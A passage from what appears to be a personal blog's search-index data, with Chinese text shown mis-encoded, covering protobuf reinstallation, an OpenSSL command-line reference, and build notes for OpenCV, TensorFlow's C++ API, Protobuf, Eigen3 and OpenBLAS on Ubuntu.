google/protobuf/struct.proto google/protobuf/timestamp.proto google/protobuf/type.proto google/protobuf/wrappers.proto google/protobuf/compiler/plugin.proto ) ( cd '/usr/local/include' &amp;&amp; rm -f google/protobuf/stubs/callback.h google/protobuf/stubs/bytestream.h google/protobuf/stubs/casts.h google/protobuf/stubs/common.h google/protobuf/stubs/hash.h google/protobuf/stubs/logging.h google/protobuf/stubs/macros.h google/protobuf/stubs/map_util.h google/protobuf/stubs/mutex.h google/protobuf/stubs/once.h google/protobuf/stubs/platform_macros.h google/protobuf/stubs/port.h google/protobuf/stubs/status.h google/protobuf/stubs/stl_util.h google/protobuf/stubs/stringpiece.h google/protobuf/stubs/strutil.h google/protobuf/stubs/template_util.h google/protobuf/any.pb.h google/protobuf/api.pb.h google/protobuf/any.h google/protobuf/arena.h google/protobuf/arena_impl.h google/protobuf/arenastring.h google/protobuf/descriptor_database.h google/protobuf/descriptor.h google/protobuf/descriptor.pb.h google/protobuf/duration.pb.h google/protobuf/dynamic_message.h google/protobuf/empty.pb.h google/protobuf/extension_set.h google/protobuf/extension_set_inl.h google/protobuf/field_mask.pb.h google/protobuf/generated_enum_reflection.h google/protobuf/generated_enum_util.h google/protobuf/generated_message_reflection.h google/protobuf/generated_message_table_driven.h google/protobuf/generated_message_util.h google/protobuf/has_bits.h google/protobuf/implicit_weak_message.h google/protobuf/io/io_win32.h google/protobuf/map_entry.h google/protobuf/map_entry_lite.h google/protobuf/map_field.h google/protobuf/map_field_inl.h google/protobuf/map_field_lite.h google/protobuf/map.h google/protobuf/map_type_handler.h google/protobuf/message.h google/protobuf/message_lite.h google/protobuf/metadata.h google/protobuf/metadata_lite.h google/protobuf/parse_context.h google/protobuf/port.h google/protobuf/port_def.inc google/protobuf/port_undef.inc google/protobuf/reflection.h google/protobuf/reflection_ops.h google/protobuf/repeated_field.h google/protobuf/service.h google/protobuf/source_context.pb.h google/protobuf/struct.pb.h google/protobuf/text_format.h google/protobuf/timestamp.pb.h google/protobuf/type.pb.h google/protobuf/unknown_field_set.h google/protobuf/wire_format.h google/protobuf/wire_format_lite.h google/protobuf/wrappers.pb.h google/protobuf/io/coded_stream.h google/protobuf/io/gzip_stream.h google/protobuf/io/printer.h google/protobuf/io/strtod.h google/protobuf/io/tokenizer.h google/protobuf/io/zero_copy_stream.h google/protobuf/io/zero_copy_stream_impl.h google/protobuf/io/zero_copy_stream_impl_lite.h google/protobuf/compiler/code_generator.h google/protobuf/compiler/command_line_interface.h google/protobuf/compiler/importer.h google/protobuf/compiler/parser.h google/protobuf/compiler/plugin.h google/protobuf/compiler/plugin.pb.h google/protobuf/compiler/cpp/cpp_generator.h google/protobuf/compiler/csharp/csharp_generator.h google/protobuf/compiler/csharp/csharp_names.h google/protobuf/compiler/java/java_generator.h google/protobuf/compiler/java/java_names.h google/protobuf/compiler/js/js_generator.h google/protobuf/compiler/js/well_known_types_embed.h google/protobuf/compiler/objectivec/objectivec_generator.h google/protobuf/compiler/objectivec/objectivec_helpers.h google/protobuf/compiler/php/php_generator.h google/protobuf/compiler/python/python_generator.h google/protobuf/compiler/ruby/ruby_generator.h google/protobuf/util/type_resolver.h google/protobuf/util/delimited_message_util.h google/protobuf/util/field_comparator.h google/protobuf/util/field_mask_util.h google/protobuf/util/json_util.h google/protobuf/util/time_util.h google/protobuf/util/type_resolver_util.h google/protobuf/util/message_differencer.h ) make[1]: Leaving directory '/home/siz/soft/protobuf-3.15.8/src' siz@ubuntu:~/soft/protobuf-3.15.8$ which protoc siz@ubuntu:~/soft/protobuf-3.15.8$ é‡æ–°å®‰è£…protobuf protobuf github release åœ°å€: https://github.com/protocolbuffers/protobuf/releases ä¸‹è½½å¯¹åº”çš„3.92ç‰ˆæœ¬: å¹¶è§£å‹ cd protobuf-XXX/ ./autogen.sh ./configure make make check sudo make install sudo ldconfig # refresh shared library cache. æŸ¥çœ‹ç‰ˆæœ¬ protoc --version è‡³æ­¤å®‰è£…å®Œæˆ","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æŠ€æœ¯å‘/æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/navigation/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"Tensorflow","slug":"æœºå™¨å­¦ä¹ /Tensorflow","permalink":"https://www.sizaif.com/navigation/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/Tensorflow/"}],"tags":[{"name":"OpenCV","slug":"OpenCV","permalink":"https://www.sizaif.com/tags/OpenCV/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"Tensorflow","slug":"Tensorflow","permalink":"https://www.sizaif.com/tags/Tensorflow/"}],"author":"sizaif"},{"title":"OpenSSL ä½¿ç”¨æ‰‹å†Œ","slug":"OpenSSL-ä½¿ç”¨æ‰‹å†Œ","date":"2021-08-10T06:34:10.000Z","updated":"2021-08-14T14:15:24.735Z","comments":true,"path":"posts/e82eda1b/","link":"","permalink":"https://www.sizaif.com/posts/e82eda1b/","excerpt":"","text":"OpenSSL å‘½ä»¤è¡Œè§£æ ğŸ˜„ @Auther: sizaif ğŸ“† 2021-05-09 16:32:02 [TOC] å‚è€ƒæ–‡æ¡£ æœåŠ¡ç«¯: https://www.openssl.org/docs/man1.0.2/man1/openssl-s_server.html å®¢æˆ·ç«¯:https://www.openssl.org/docs/man1.0.2/man1/s_client.html OpenSSLå‘½ä»¤åˆ†ä¸ºä»¥ä¸‹3ä¸ªéƒ¨åˆ†ã€‚ æ ‡å‡†å‘½ä»¤Standard commands 1.asn1parse: asn1parseç”¨äºè§£é‡Šç”¨ANS.1è¯­æ³•ä¹¦å†™çš„è¯­å¥(ASNä¸€èˆ¬ç”¨äºå®šä¹‰è¯­æ³•çš„æ„æˆ) æ¼”ç¤ºå‘½ä»¤æ“ä½œé¡ºåºï¼š4 -&gt; 5 -&gt; 3 -&gt; 2-&gt; 6 -&gt; 7 -&gt;8 2.ca: caç”¨äºCAçš„ç®¡ç†. ç”¨æ³•ï¼š openssl ca [-options]ã€‚ code 2.1) -selfsign ä½¿ç”¨å¯¹è¯ä¹¦è¯·æ±‚è¿›è¡Œç­¾åçš„å¯†é’¥å¯¹æ¥ç­¾å‘è¯ä¹¦ã€‚å³\"è‡ªç­¾å\"ï¼Œè¿™ç§æƒ…å†µå‘ç”Ÿåœ¨ç”Ÿæˆè¯ä¹¦çš„å®¢æˆ·ç«¯ã€ç­¾å‘è¯ä¹¦çš„CAéƒ½æ˜¯åŒä¸€å°æœºå™¨(ä¹Ÿæ˜¯æˆ‘ä»¬å¤§å¤šæ•°å®éªŒä¸­çš„æƒ…å†µ)ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŒä¸€ä¸ªå¯†é’¥å¯¹æ¥è¿›è¡Œ\"è‡ªç­¾å\" 2.2) -in file éœ€è¦è¿›è¡Œå¤„ç†çš„PEMæ ¼å¼çš„è¯ä¹¦ 2.3) -out file å¤„ç†ç»“æŸåè¾“å‡ºçš„è¯ä¹¦æ–‡ä»¶ 2.4) -cert file ç”¨äºç­¾å‘çš„æ ¹CAè¯ä¹¦ 2.5) -days arg æŒ‡å®šç­¾å‘çš„è¯ä¹¦çš„æœ‰æ•ˆæ—¶é—´ 2.6) -keyfile arg CAçš„ç§é’¥è¯ä¹¦æ–‡ä»¶ 2.7) -keyform arg CAçš„æ ¹ç§é’¥è¯ä¹¦æ–‡ä»¶æ ¼å¼: 2.7.1) PEM 2.7.2) ENGINE 2.8) -key arg CAçš„æ ¹ç§é’¥è¯ä¹¦æ–‡ä»¶çš„è§£å¯†å¯†ç (å¦‚æœåŠ å¯†äº†çš„è¯) 2.9) -config file é…ç½®æ–‡ä»¶ 3. X.509è¯ä¹¦ç­¾å‘è¯·æ±‚(CSR)ç®¡ç† ç”¨æ³•ï¼š openssl req [options] outfile code 3.1) -inform arg è¾“å…¥æ–‡ä»¶æ ¼å¼ 3.1.1) DER 3.1.2) PEM 3.2) -outform arg è¾“å‡ºæ–‡ä»¶æ ¼å¼ 3.2.1) DER 3.2.2) PEM 3.3) -in arg å¾…å¤„ç†æ–‡ä»¶ 3.4) -out arg å¾…è¾“å‡ºæ–‡ä»¶ 3.5) -passin ç”¨äºç­¾åå¾…ç”Ÿæˆçš„è¯·æ±‚è¯ä¹¦çš„ç§é’¥æ–‡ä»¶çš„è§£å¯†å¯†ç  3.6) -key file ç”¨äºç­¾åå¾…ç”Ÿæˆçš„è¯·æ±‚è¯ä¹¦çš„ç§é’¥æ–‡ä»¶ 3.7) -keyform arg 3.7.1) DER 3.7.2) NET 3.7.3) PEM 3.8) -new æ–°çš„è¯·æ±‚ 3.9) -x509 è¾“å‡ºä¸€ä¸ªX509æ ¼å¼çš„è¯ä¹¦ 3.10) -days X509è¯ä¹¦çš„æœ‰æ•ˆæ—¶é—´ 3.11) -newkey rsa:bits ç”Ÿæˆä¸€ä¸ªbitsé•¿åº¦çš„RSAç§é’¥æ–‡ä»¶ï¼Œç”¨äºç­¾å‘ 3.12) -[digest] HASHç®—æ³• 3.12.1) md5 3.12.2) sha1 3.12.3) md2 3.12.4) mdc2 3.12.5) md4 3.13) -config file æŒ‡å®šopensslé…ç½®æ–‡ä»¶ 3.14) -text: textæ˜¾ç¤ºæ ¼å¼ 4. genrsa: ç”ŸæˆRSAå‚æ•° ç”¨æ³•ï¼š code openssl genrsa [args] [numbits] 4.1) å¯¹ç”Ÿæˆçš„ç§é’¥æ–‡ä»¶æ˜¯å¦è¦ä½¿ç”¨åŠ å¯†ç®—æ³•è¿›è¡Œå¯¹ç§°åŠ å¯†: 4.1.1) -des: CBCæ¨¡å¼çš„DESåŠ å¯† 4.1.2) -des3: CBCæ¨¡å¼çš„3DESåŠ å¯† 4.1.3) -aes128: CBCæ¨¡å¼çš„AES128åŠ å¯† 4.1.4) -aes192: CBCæ¨¡å¼çš„AES192åŠ å¯† 4.1.5) -aes256: CBCæ¨¡å¼çš„AES256åŠ å¯† 4.2) -passout arg: argä¸ºå¯¹ç§°åŠ å¯†(desã€3desã€aes)çš„å¯†ç (ä½¿ç”¨è¿™ä¸ªå‚æ•°å°±çœå»äº†consoleäº¤äº’æç¤ºè¾“å…¥å¯†ç çš„ç¯èŠ‚) 4.3) -out file: è¾“å‡ºè¯ä¹¦ç§é’¥æ–‡ä»¶ [numbits]: å¯†é’¥é•¿åº¦ example: ç”Ÿæˆä¸€ä¸ª1024ä½çš„RSAç§é’¥ï¼Œå¹¶ç”¨3DESåŠ å¯†(å¯†ç ä¸º123456)ï¼Œä¿å­˜ä¸ºserver.keyæ–‡ä»¶ openssl genrsa -out server.key -passout pass:123456 -des3 1024 5. RSAæ•°æ®ç®¡ç† ç”¨æ³•ï¼š openssl rsa [options] outfile code 5.1) -inform arg è¾“å…¥å¯†é’¥æ–‡ä»¶æ ¼å¼: 5.1.1) DER(ASN1) 5.1.2) NET 5.1.3) PEM(base64ç¼–ç æ ¼å¼) 5.2) -outform arg è¾“å‡ºå¯†é’¥æ–‡ä»¶æ ¼å¼ 5.2.1) DER 5.2.2) NET 5.2.3) PEM 5.3) -in arg å¾…å¤„ç†å¯†é’¥æ–‡ä»¶ 5.4) -passin arg è¾“å…¥è¿™ä¸ªåŠ å¯†å¯†é’¥æ–‡ä»¶çš„è§£å¯†å¯†é’¥(å¦‚æœåœ¨ç”Ÿæˆè¿™ä¸ªå¯†é’¥æ–‡ä»¶çš„æ—¶å€™ï¼Œé€‰æ‹©äº†åŠ å¯†ç®—æ³•äº†çš„è¯) 5.5) -out arg å¾…è¾“å‡ºå¯†é’¥æ–‡ä»¶ 5.6) -passout arg å¦‚æœå¸Œæœ›è¾“å‡ºçš„å¯†é’¥æ–‡ä»¶ç»§ç»­ä½¿ç”¨åŠ å¯†ç®—æ³•çš„è¯åˆ™æŒ‡å®šå¯†ç  5.7) -des: CBCæ¨¡å¼çš„DESåŠ å¯† 5.8) -des3: CBCæ¨¡å¼çš„3DESåŠ å¯† 5.9) -aes128: CBCæ¨¡å¼çš„AES128åŠ å¯† 5.10) -aes192: CBCæ¨¡å¼çš„AES192åŠ å¯† 5.11) -aes256: CBCæ¨¡å¼çš„AES256åŠ å¯† 5.12) -text: ä»¥textå½¢å¼æ‰“å°å¯†é’¥keyæ•°æ® 5.13) -noout: ä¸æ‰“å°å¯†é’¥keyæ•°æ® 5.14) -pubin: æ£€æŸ¥å¾…å¤„ç†æ–‡ä»¶æ˜¯å¦ä¸ºå…¬é’¥æ–‡ä»¶ 5.15) -pubout: è¾“å‡ºå…¬é’¥æ–‡ä»¶ 6. x509 openssl x509æ˜¯ä¸€ä¸ªåŠŸèƒ½å¾ˆä¸°å¯Œçš„è¯ä¹¦å¤„ç†å·¥å…·ã€‚å¯ä»¥ç”¨æ¥æ˜¾ç¤ºè¯ä¹¦çš„å†…å®¹ï¼Œè½¬æ¢å…¶æ ¼å¼ï¼Œç»™CSRç­¾åç­‰X.509è¯ä¹¦çš„ç®¡ç†å·¥ä½œ ç”¨æ³•ï¼š openssl x509 [args] code 6.1) -inform arg å¾…å¤„ç†X509è¯ä¹¦æ–‡ä»¶æ ¼å¼ 6.1.1) DER 6.1.2) NET 6.1.3) PEM 6.2) -outform arg å¾…è¾“å‡ºX509è¯ä¹¦æ–‡ä»¶æ ¼å¼ 6.2.1) DER 6.2.2) NET 6.2.3) PEM 6.3) -in arg å¾…å¤„ç†X509è¯ä¹¦æ–‡ä»¶ 6.4) -out arg å¾…è¾“å‡ºX509è¯ä¹¦æ–‡ä»¶ 6.5) -req è¡¨æ˜è¾“å…¥æ–‡ä»¶æ˜¯ä¸€ä¸ª\"è¯·æ±‚ç­¾å‘è¯ä¹¦æ–‡ä»¶(CSR)\"ï¼Œç­‰å¾…è¿›è¡Œç­¾å‘ 6.6) -days arg è¡¨æ˜å°†è¦ç­¾å‘çš„è¯ä¹¦çš„æœ‰æ•ˆæ—¶é—´ 6.7) -CA arg æŒ‡å®šç”¨äºç­¾å‘è¯·æ±‚è¯ä¹¦çš„æ ¹CAè¯ä¹¦ 6.8) -CAform arg æ ¹CAè¯ä¹¦æ ¼å¼(é»˜è®¤æ˜¯PEM) 6.9) -CAkey arg æŒ‡å®šç”¨äºç­¾å‘è¯·æ±‚è¯ä¹¦çš„CAç§é’¥è¯ä¹¦æ–‡ä»¶ï¼Œå¦‚æœè¿™ä¸ªoptionæ²¡æœ‰å‚æ•°è¾“å…¥ï¼Œé‚£ä¹ˆç¼ºçœè®¤ä¸ºç§æœ‰å¯†é’¥åœ¨CAè¯ä¹¦æ–‡ä»¶é‡Œæœ‰ 6.10) -CAkeyform arg æŒ‡å®šæ ¹CAç§é’¥è¯ä¹¦æ–‡ä»¶æ ¼å¼(é»˜è®¤ä¸ºPEMæ ¼å¼) 6.11) -CAserial arg æŒ‡å®šåºåˆ—å·æ–‡ä»¶(serial number file) 6.12) -CAcreateserial å¦‚æœåºåˆ—å·æ–‡ä»¶(serial number file)æ²¡æœ‰æŒ‡å®šï¼Œåˆ™è‡ªåŠ¨åˆ›å»ºå®ƒ 7 dhparam openssl dhparamç”¨äºç”Ÿæˆå’Œç®¡ç†dhæ–‡ä»¶ã€‚dh(Diffie-Hellman)æ˜¯è‘—åçš„å¯†é’¥äº¤æ¢åè®®ï¼Œæˆ–ç§°ä¸ºå¯†é’¥åå•†åè®®ï¼Œå®ƒå¯ä»¥ä¿è¯é€šä¿¡åŒæ–¹å®‰å…¨åœ°äº¤æ¢å¯†é’¥ã€‚ä½†æ³¨æ„ï¼Œå®ƒä¸æ˜¯åŠ å¯†ç®—æ³•ï¼Œæ‰€ä»¥ä¸æä¾›åŠ å¯†åŠŸèƒ½ï¼Œä»…ä»…åªæ˜¯ä¿æŠ¤å¯†é’¥äº¤æ¢çš„è¿‡ç¨‹ã€‚åœ¨openvpnä¸­å°±ä½¿ç”¨äº†è¯¥äº¤æ¢åè®® code openssl dhparam [-in filename] [-out filename] [-dsaparam] [-noout] [-text] [-rand file(s)] [numbits] é€‰é¡¹è¯´æ˜ï¼š -in filenameï¼šä»filenameæ–‡ä»¶ä¸­è¯»å–å¯†é’¥äº¤æ¢åè®®å‚æ•°ã€‚ -out filenameï¼šè¾“å‡ºå¯†é’¥äº¤æ¢åè®®å‚æ•°åˆ°filenameæ–‡ä»¶ã€‚ -dsaparamï¼šæŒ‡å®šæ­¤é€‰é¡¹å°†ä½¿ç”¨dsaäº¤æ¢åè®®æ›¿ä»£dhäº¤æ¢åè®®ã€‚è™½ç„¶ç”Ÿæˆé€Ÿåº¦æ›´å¿«ï¼Œä½†æ›´ä¸å®‰å…¨ã€‚ -nooutï¼šç¦æ­¢è¾“å‡ºä»»ä½•ä¿¡æ¯ã€‚ -textï¼šä»¥æ–‡æœ¬æ ¼å¼è¾“å‡ºdhåè®®ã€‚ -randï¼šæŒ‡å®šéšæœºæ•°ç§å­æ–‡ä»¶ã€‚ numbitsï¼šæŒ‡å®šç”Ÿæˆçš„é•¿åº¦ã€‚ ä½¿ç”¨ å®¢æˆ·ç«¯ openssl s_client -key ./experiments/keystore/client.key -cert ./experiments/keystore/client.crt -CAfile ./experiments/keystore/demoCA/cacert.pem æœåŠ¡ç«¯ openssl s_server -key ./experiments/keystore/server.key -cert ./experiments/keystore/server.crt -CAfile ./experiments/keystore/demoCA/cacert.pem -accept 4433 -HTTP","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"ç¬”è®°","slug":"ç¬”è®°","permalink":"https://www.sizaif.com/navigation/categories/%E7%AC%94%E8%AE%B0/"},{"name":"SSL","slug":"ç¬”è®°/SSL","permalink":"https://www.sizaif.com/navigation/categories/%E7%AC%94%E8%AE%B0/SSL/"},{"name":"SSL","slug":"æŠ€æœ¯å‘/SSL","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/SSL/"}],"tags":[{"name":"SSL","slug":"SSL","permalink":"https://www.sizaif.com/tags/SSL/"},{"name":"ç¬”è®°","slug":"ç¬”è®°","permalink":"https://www.sizaif.com/tags/%E7%AC%94%E8%AE%B0/"},{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://www.sizaif.com/tags/OpenSSL/"}],"author":"sizaif"},{"title":"OpenCV Tensorflow C++API   Protobuf Eigen3 ç¼–è¯‘è¿‡ç¨‹","slug":"OpenCV-Tensorflow-C-API-Protobuf-eigen3-ç¼–è¯‘è¿‡ç¨‹","date":"2021-08-10T06:22:04.000Z","updated":"2021-08-14T14:15:24.732Z","comments":true,"path":"posts/56ff1cb1/","link":"","permalink":"https://www.sizaif.com/posts/56ff1cb1/","excerpt":"","text":"OpenCV Tensorflow C++API Protobuf eigen3 ç¼–è¯‘è¿‡ç¨‹ @auther by sizaif 2021-08-10 14:22:25 [TOC] OpenCV é¦–å…ˆå®‰è£…OpenCVçš„ä¾èµ–æ–‡ä»¶ï¼Œåœ¨ç»ˆç«¯è¿è¡Œä¸‹é¢å‘½ä»¤ï¼š code sudo apt-get install build-essential sudo apt-get install cmake git libgtk2.0-dev pkg-config libavcodec-dev libavformat-dev libswscale-dev sudo apt-get install python-dev python-numpy libtbb2 libtbb-dev libjpeg-dev libpng-dev libtiff-dev libjasper-dev libdc1394-22-dev # if errorE: unable to locate libjasper-dev sudo add-apt-repository \"deb http://security.ubuntu.com/ubuntu xenial-security main\" # or vim sources.list add \"deb http://security.ubuntu.com/ubuntu xenial-security main\" and update vim /etc/apt/sources.list sudo apt update sudo apt install libjasper1 libjasper-dev Install compiler and build tools To compile OpenCV you will need a C++ compiler. Usually it is G++/GCC or Clang/LLVM: Install GCCâ€¦ sudo apt install -y g++ â€¦ or Clang: sudo apt install -y clang OpenCV uses CMake build configuration tool: sudo apt install -y cmake CMake can generate scripts for different build systems, e.g. make,ninja: Install Makeâ€¦ sudo apt install -y make â€¦ or Ninja: sudo apt install -y ninja-build Install tool for getting and unpacking sources: wget and unzip â€¦ sudo apt install -y wget unzip â€¦ or git : sudo apt install -y git Download sources There are two methods of getting OpenCV sources: Download snapshot of repository using web browser or any download tool (~80-90Mb) and unpack itâ€¦ wget -O opencv.zip https://github.com/opencv/opencv/archive/master.zipunzip opencv.zipmv opencv-master opencv â€¦ or clone repository to local machine using git to get full change history (&gt;470Mb): git clone https://github.com/opencv/opencv.gitgit -C opencv checkout master Note Snapshots of other branches, releases or commits can be found on the GitHub and the official download page. Configure and build Create build directory: mkdir -p build &amp;&amp; cd build Configure - generate build scripts for the preferred build system: For makeâ€¦ #è‡ªå®šä¹‰è·¯å¾„å®‰è£…OpenCV åˆ° /usr/local/opencv ä¸­cmake -D CMAKE_INSTALL_PREFIX=/usr/local/opencv ../opencv â€¦ or for ninja : cmake -GNinja ../opencv Build - run actual compilation process: Using make â€¦ make -j4 â€¦ or ninja : ninja Note Configure process can download some files from the internet to satisfy library dependencies, connection failures can cause some of modules or functionalities to be turned off or behave differently. Refer to the OpenCV installation overview and OpenCV configuration options reference tutorials for details and full configuration options reference. If you experience problems with the build process, try to clean or recreate the build directory. Changes in the configuration like disabling a dependency, modifying build scripts or switching sources to another branch are not handled very well and can result in broken workspace. Make can run multiple compilation processes in parallel, -j&lt;NUM&gt; option means â€œrun jobs simultaneouslyâ€. Ninja will automatically detect number of available processor cores and does not need -j option. Check build results After successful build you will find libraries in the build/lib directory and executables (test, samples, apps) in the build/bin directory: ls binls lib CMake package files will be located in the build root: ls OpenCVConfig*.cmakels OpenCVModules.cmake Install Warning The installation process only copies files to predefined locations and does minor patching. Installing using this method does not integrate opencv into the system package registry and thus, for example, opencv can not be uninstalled automatically. We do not recommend system-wide installation to regular users due to possible conflicts with system packages. By default OpenCV will be installed to the /usr/local directory, all files will be copied to following locations: /usr/local/bin - executable files /usr/local/lib - libraries (.so) /usr/local/cmake/opencv4 - cmake package /usr/local/include/opencv4 - headers /usr/local/share/opencv4 - other files (e.g. trained cascades in XML format) Since /usr/local is owned by the root user, the installation should be performed with elevated privileges (sudo): sudo make install or sudo ninja install Installation root directory can be changed with CMAKE_INSTALL_PREFIX configuration parameter, e.g. -DCMAKE_INSTALL_PREFIX=$HOME/.local to install to current userâ€™s local directory. Installation layout can be changed with OPENCV_*_INSTALL_PATH parameters. See OpenCV configuration options reference for details. Generated on Tue Apr 20 2021 02:31:39 for OpenCV by 1.8.13 Tensorflow bazel code # Bazel needs a C++ compiler and unzip / zip in order to work: sudo apt install g++ unzip zip # Run the installer chmod +x bazel-&lt;version>-installer-linux-x86_64.sh ./bazel-&lt;version>-installer-linux-x86_64.sh --user # Set up your environment vim ~/.bashrc export PATH=\"$PATH:$HOME/bin\" source ~/.bashrc tensorflow-v2.4.0 code # å®‰è£…ä»¥ä¸‹æ„å»ºå·¥å…·ä»¥é…ç½®å¼€å‘ç¯å¢ƒã€‚ sudo apt install python3-dev python3-pip pip install numpy # å®‰è£… Bazel git clone https://github.com/tensorflow/tensorflow.git cd tensorflow git checkout branch_name # r2.2, r2.3, etc. ./configure # CUDA GPU bazel build --config=opt --config=cuda //tensorflow:libtensorflow_cc.so # CPU bazel build --config=opt //tensorflow:libtensorflow_cc.so # ç¼–è¯‘å®Œæˆå, å°†å¤´æ–‡ä»¶ ( bazel-bin/tensorflow å’Œ ä¸‹ **.so å¤åˆ¶åˆ° /usr/local/include/tf/tensorflow å’Œ /usr/local/lib mkdir /usr/local/include/tf cp -r bazel-bin/tensorflow/* /usr/local/include/tf/tensorflow/ sudo cp -r bazel-bin/tensorflow/*.so /usr/local/lib/ æµ‹è¯• CMakeLists.txt CMakeLists.txt cmake_minimum_required(VERSION 2.8) # project Name &amp; Version project(STOtest) # find_package find_package(OpenCV REQUIRED) # set location # Openblas set(OpenBlas_DIR /usr/local/OpenBlas) # eigen set(Eigen_DIR /usr/local/include/eigen3) # tensorflow set(Tensorflow_INCLUDES /usr/local/include/tf/ /usr/local/include/tf/tensorflow/ /usr/local/include/tf/tensorflow/third-party) set(Tensorflow_LIBS /usr/local/lib/libtensorflow_cc.so /usr/local/lib/libtensorflow_framework.so) # protobuf set(Protobuf_INCLUDES /usr/local/include/google) set(Protobuf_LIBS /usr/local/bin/protoc) message(STATUS: \"OpenBlas_DIR= $&#123;OpenBlas_DIR&#125;\") message(STATUS \"OpenCV library status:\") message(STATUS \" config=: $&#123;OpenCV_DIR&#125;\") message(STATUS \" version=: $&#123;OpenCV_VERSION&#125;\") message(STATUS \" libraries=: $&#123;OpenCV_LIBS&#125;\") message(STATUS \" include path=: $&#123;OpenCV_INCLUDE_DIRS&#125;\") # include include_directories( $&#123;Tensorflow_INCLUDES&#125; $&#123;Eigen_DIR&#125; $&#123;OpenBlas_DIR&#125; $&#123;Protobuf_INCLUDES&#125; ) # src cpp aux_source_directory(./src DIR_SRCS) add_executable( main .$&#123;DIR_SRCS&#125;) # target target_link_libraries(main PRIVATE $&#123;OpenCV_LIBS&#125; $&#123;Tensorflow_LIBS&#125; $&#123;Protobuf_LIBS&#125;) code &#x2F;&#x2F;#include &quot;opencv2&#x2F;highgui.hpp&quot; &#x2F;&#x2F;#include &quot;opencv2&#x2F;imgproc.hpp&quot; #include &lt;tensorflow&#x2F;core&#x2F;platform&#x2F;env.h&gt; #include &lt;tensorflow&#x2F;core&#x2F;public&#x2F;session.h&gt; #include &lt;iostream&gt; &#x2F;&#x2F;susing namespace cv; using namespace std; using namespace tensorflow; int main( ) &#123; cout &lt;&lt; &quot;hello tensorflow&quot; &lt;&lt;endl; Session* session; Status status &#x3D; NewSession(SessionOptions(), &amp;session); if (!status.ok()) &#123; cout &lt;&lt; status.ToString() &lt;&lt; endl; cout &lt;&lt;&quot;Session not ok&quot; &lt;&lt; endl; return 1; &#125; cout &lt;&lt; &quot;Session successfully created.&quot;&lt;&lt;endl; return 0; &#125; Protobuf 1ï¼‰ä¸ŠGithubä¸‹è½½protocbufæºç åŒ… https://github.com/protocolbuffers/protobuf/releases/tag/vX.X.X 2ï¼‰å®‰è£…ä¾èµ–åŒ… sudo apt-get install autoconf automake libtool curl make g++ unzip 3ï¼‰è¿›å…¥æºç ç›®å½•ï¼Œæ‰§è¡Œ./autogen.shç”Ÿæˆconfigureæ–‡ä»¶ 4ï¼‰ä¾æ¬¡æ‰§è¡Œ code ./configure make make check sudo make install sudo ldconfig # refresh shared library cache. # éªŒè¯ç‰ˆæœ¬ siz@ubuntu:~$ protoc --version libprotoc 3.9.2 siz@ubuntu:~$ whereis protoc protoc: /usr/local/bin/protoc Eigen3 ç®€å•å‘½ä»¤å®‰è£… sudo apt-get install libeigen3-dev æºç ç¼–è¯‘å®‰è£… code http://eigen.tuxfamily.org/index.php?title=Main_Page git clone https://gitlab.com/libeigen/eigen.git mkdir build cd build cmake .. sudo make instal # å®‰è£…æˆåŠŸå,å¤´æ–‡ä»¶è·¯å¾„åœ¨ /usr/local/include/eigen3/ # CMakeLists.txt ä¸­æ·»åŠ  eigen3 å¤´æ–‡ä»¶ include_directories( \"/usr/include/eigen3\" ) OpenBlas code git clone https://github.com/xianyi/OpenBLAS.git cd OpenBLAS make make PREFIX=/usr/local/Openblas install","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æŠ€æœ¯å‘/æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/navigation/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"OpenCV","slug":"æœºå™¨å­¦ä¹ /OpenCV","permalink":"https://www.sizaif.com/navigation/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/OpenCV/"},{"name":"Tensorflow","slug":"æœºå™¨å­¦ä¹ /Tensorflow","permalink":"https://www.sizaif.com/navigation/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/Tensorflow/"}],"tags":[{"name":"OpenCV","slug":"OpenCV","permalink":"https://www.sizaif.com/tags/OpenCV/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"Tensorflow","slug":"Tensorflow","permalink":"https://www.sizaif.com/tags/Tensorflow/"}],"author":"sizaif"},{"title":"GnuTLS ä½¿ç”¨æ‰‹å†Œ","slug":"GnuTLS-ä½¿ç”¨æ‰‹å†Œ","date":"2021-08-10T06:20:43.000Z","updated":"2021-08-14T14:15:24.729Z","comments":true,"path":"posts/89554caf/","link":"","permalink":"https://www.sizaif.com/posts/89554caf/","excerpt":"","text":"GnuTLS ä½¿ç”¨æ‰‹å†Œ ğŸ˜„ @by sizaif ğŸ“† 2021-05-17 